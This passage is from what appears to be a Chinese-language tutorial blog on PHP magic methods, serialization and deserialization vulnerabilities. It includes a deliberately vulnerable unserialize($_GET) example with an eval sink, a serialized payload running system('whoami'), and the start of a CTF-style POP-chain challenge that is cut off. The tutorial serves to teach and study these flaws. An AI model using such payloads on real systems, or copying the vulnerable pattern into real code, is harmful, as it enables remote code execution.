&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;魔术方法&#34;&gt;魔术方法&lt;/h2&gt;
&lt;p&gt;何为魔术方法？指的是:具备被应用自动调用的特性的一类方法(函数)，即触发了某事件前或后，魔术方法将自动调用执行，而一般函数必须手动调用。PHP将以&amp;quot;__&amp;ldquo;为开头的类方法保留为魔术方法。&lt;/p&gt;
&lt;p&gt;常见的魔术方法：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;方法名称&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;作用&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;__get&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;原本类中的私有属性是无法直接访问的，PHP使用了该方法帮助获取私有属性，因此在调用私有属性或者该类不拥有的属性的时候会自动执行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;__set&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;在设置不可访问属性的值时，即在调用私有属性的时候会自动执行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;__toString&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;当对象被当做一个字符串使用时调用(返回一个该类被当作字符串使用时所能替代的字符串)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;__sleep&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;序列化对象之前调用(返回一个包含应被序列化的属性的数组)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;__wakeup&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;反序列化对象之前调用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;__call&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;该方法在调用的方法不存在时会自动调用，程序仍会继续执行下去&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;__isset&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;当对不可访问属性调用 isset()或empty()时会被调用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;__unset&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;当对不可访问属性调用unset()时会被调用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;__invoke&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;当脚本尝试将对象调用为函数时触发&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;__callStatic()&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;在静态上下文中调用不可访问的方法时触发&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;魔术方法举例：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
class Person {
	private $name = &amp;quot;cool&amp;quot;;
	public function haha() {
		echo &amp;quot;\n&amp;quot;.$this-&amp;gt;name.&amp;quot;:hello!\n&amp;quot;;	
	}
	

	
	public function __wakeup() {
		echo &amp;quot;\n __wakeup method!\n&amp;quot;;
	}
	
	public function __construct() {
		echo &amp;quot;\n __construct method!\n&amp;quot;;
	}
	
	public function __destruct() {
		echo &amp;quot;\n __destruct method!\n&amp;quot;;
	}
	
	public function __set($key, $value) {
		echo &amp;quot;\n __set method!\n&amp;quot;;
	}
	
	public function __get($key) {
		echo &amp;quot;\n __get method!\n&amp;quot;;
	}
	
	public function __toString() {
		echo &amp;quot;\n __toString method!\n&amp;quot;;
	}
}

$person1 = new Person();
$person1-&amp;gt;name = &amp;quot;new cool&amp;quot;;
echo $person1-&amp;gt;name;
$ser_person1 = serialize($person1);
$unser_person1 = unserialize($ser_person1);
print_r($unser_person1);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 138; 
			flex-basis: 331px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-1/image-20211202205329823.png&#34; data-size=&#34;611x442&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-1/image-20211202205329823.png&#34;
			width=&#34;611&#34;
			height=&#34;442&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-1/image-20211202205329823_hu6305e920c58f466267e32dbc61a7ab33_29920_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-1/image-20211202205329823_hu6305e920c58f466267e32dbc61a7ab33_29920_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;注：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;print_r接受对象类型，所以未调用__toString，如果使用print或echo函数，则会发生调用；&lt;/p&gt;
&lt;p&gt;反序列化后产生两个对象，随后两个对象都消亡，调用两次__destruct；&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;序列化定义&#34;&gt;序列化定义&lt;/h2&gt;
&lt;p&gt;序列化指将对象或数据结构转换为可存储形式(字符串)的过程。目的是为了更方便存储和传输数据结构或对象。&lt;/p&gt;
&lt;p&gt;PHP序列化方法：&lt;/p&gt;
&lt;p&gt;serialize()、json_encode()&lt;/p&gt;
&lt;p&gt;序列化例子：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
class Person {
	public $name = &amp;quot;cool&amp;quot;;
	private $age = &amp;quot;18&amp;quot;;
	protected $sex = &amp;quot;boy&amp;quot;;
	public function say() {
		echo $this-&amp;gt;name.&amp;quot;:hello!\n&amp;quot;;
	}
}
$person1 = new Person();
$ser_person1 = serialize($person1);
print($ser_person1);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 3294; 
			flex-basis: 7907px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-1/image-20211202212614190.png&#34; data-size=&#34;1219x37&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-1/image-20211202212614190.png&#34;
			width=&#34;1219&#34;
			height=&#34;37&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-1/image-20211202212614190_hudfce1e3c3be307dd624aeea2c23b5c3c_12976_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-1/image-20211202212614190_hudfce1e3c3be307dd624aeea2c23b5c3c_12976_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;含义解释：&lt;/p&gt;
&lt;p&gt;类：类名长度：&amp;ldquo;对应类型&amp;rdquo;：类的属性数量：{类型：属性名长度：&amp;ldquo;属性名&amp;rdquo;；类型：属性值长度：&amp;ldquo;属性值&amp;rdquo;；&amp;hellip;&amp;hellip;}&lt;/p&gt;
&lt;p&gt;注：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;发现private属性和protected属性在序列化时，属性名和属性长度与public属性不同&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;private属性在序列化时，属性名变为：\x00 + 属性所在类名 + \x00 + 属性名；属性名长度相应改变&lt;/li&gt;
&lt;li&gt;protected属性在序列化时，属性名变为：\x00 + * + \x00 + 属性名&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;反序列化定义&#34;&gt;反序列化定义&lt;/h2&gt;
&lt;p&gt;将序列化后的字符串转换为原有数据结构或对象的过程。&lt;/p&gt;
&lt;p&gt;PHP反序列化方法：&lt;/p&gt;
&lt;p&gt;unserialize()、json_decode()&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;举例：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// 将之前例子序列化后的字符串还原为对象
&amp;lt;?php
class Person {
	public $name = &amp;quot;cool&amp;quot;;
	private $age = &amp;quot;18&amp;quot;;
	protected $sex = &amp;quot;boy&amp;quot;;
	public function say() {
		echo $this-&amp;gt;name.&amp;quot;:hello!\n&amp;quot;;
	}
}

$ser = &#39;O:6:&amp;quot;Person&amp;quot;:3:{s:4:&amp;quot;name&amp;quot;;s:4:&amp;quot;cool&amp;quot;;s:3:&amp;quot;age&amp;quot;;s:2:&amp;quot;18&amp;quot;;s:3:&amp;quot;sex&amp;quot;;s:3:&amp;quot;boy&amp;quot;;}&#39;;
$unser = unserialize($ser);
var_dump($unser);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 218; 
			flex-basis: 525px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-1/image-20211202214815201.png&#34; data-size=&#34;508x232&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-1/image-20211202214815201.png&#34;
			width=&#34;508&#34;
			height=&#34;232&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-1/image-20211202214815201_hu99deb366c17bf7c809f8438eddabdc89_27641_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-1/image-20211202214815201_hu99deb366c17bf7c809f8438eddabdc89_27641_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;反序列化漏洞&#34;&gt;反序列化漏洞&lt;/h2&gt;
&lt;p&gt;反序列化漏洞就在于攻击者控制外部输入，实际攻击者可控的只是任意类对象的属性而不是方法，所以必须选择控制那些存在魔术方法(自动调用)，且方法中含有可以利用函数的类。最终实现从操控对象属性到操控敏感函数的目的。&lt;/p&gt;
&lt;h3 id=&#34;示例&#34;&gt;示例&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;A&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;test&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;say&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;B&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;say&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;haha!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Evil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$test1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;say&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;test1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;nx&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;&amp;gt;?&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;分析&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;首先可以明确&lt;code&gt;unserialize&lt;/code&gt;函数的参数是外部获取，即我们可以控制反序列化任何类对象。分析当前的三个类，在B类和Evil类中，我们无法调用其中的方法，没有什么意义，但可以明确Evil类方法中存在&lt;code&gt;eval&lt;/code&gt;危险函数。&lt;/p&gt;
&lt;p&gt;观察A类，其存在&lt;code&gt;__construct&lt;/code&gt;构造函数和&lt;code&gt;__destruct&lt;/code&gt;析构函数，在构造函数中修改&lt;code&gt;test&lt;/code&gt;属性为B类的对象，析构函数中调用了其&lt;code&gt;test&lt;/code&gt;属性的&lt;code&gt;say()&lt;/code&gt;方法，而Evil类中的&lt;code&gt;say()&lt;/code&gt;方法却调用了执行命令的函数。&lt;/p&gt;
&lt;p&gt;因此思路比较明确：只要我们反序列化时，修改A类的&lt;code&gt;test&lt;/code&gt;属性为Evil类对象，则在A类对象销毁时会调用Evil类中的&lt;code&gt;say()&lt;/code&gt;，从而实现反序列化执行任意命令。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;payload&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;A&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;test&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Evil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Evil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$test1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;system(&amp;#39;whoami&amp;#39;);&amp;#34;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;$A&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$A&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;序列化生成payload：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 3409; 
			flex-basis: 8182px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-1/image-20220220175040048.png&#34; data-size=&#34;716x21&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-1/image-20220220175040048.png&#34;
			width=&#34;716&#34;
			height=&#34;21&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-1/image-20220220175040048_hu94f5062702e7451ec126506fe070bbba_8232_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-1/image-20220220175040048_hu94f5062702e7451ec126506fe070bbba_8232_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注意不要丢掉private属性的属性名中的&lt;code&gt;%00&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;O:1:&amp;quot;A&amp;quot;:1:{s:7:&amp;quot;%00A%00test&amp;quot;;O:4:&amp;quot;Evil&amp;quot;:1:{s:5:&amp;quot;test1&amp;quot;;s:17:&amp;quot;system(&#39;whoami&#39;);&amp;quot;;}}
&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 855; 
			flex-basis: 2054px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-1/image-20220220175150785.png&#34; data-size=&#34;1318x154&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-1/image-20220220175150785.png&#34;
			width=&#34;1318&#34;
			height=&#34;154&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-1/image-20220220175150785_hu02ff1d080a99e77ece3495dc316e1a79_23872_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-1/image-20220220175150785_hu02ff1d080a99e77ece3495dc316e1a79_23872_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;php反序列化pop链&#34;&gt;PHP反序列化POP链&lt;/h2&gt;
&lt;h3 id=&#34;pop链&#34;&gt;POP链&lt;/h3&gt;
&lt;p&gt;POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是&lt;strong&gt;从现有运行环境&lt;/strong&gt;中寻找一系列的代码或者指令调用，然后根据需求&lt;strong&gt;构成一组连续的调用链,最终达到攻击效果&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;实际上ROP 是通过栈溢出实现控制指令的执行流程；而反序列化就是通过控制对象的属性从而实现控制程序的执行流程。&lt;/p&gt;
&lt;h3 id=&#34;示例-1&#34;&gt;示例&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;//flag is in flag.php
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;error_reporting&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Read&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;file_get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$text&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;base64_encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;file_get_contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__invoke&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$content&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;file_get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Show&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$source&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;index.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;source&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;source&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Welcome&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__toString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;str&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;source&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
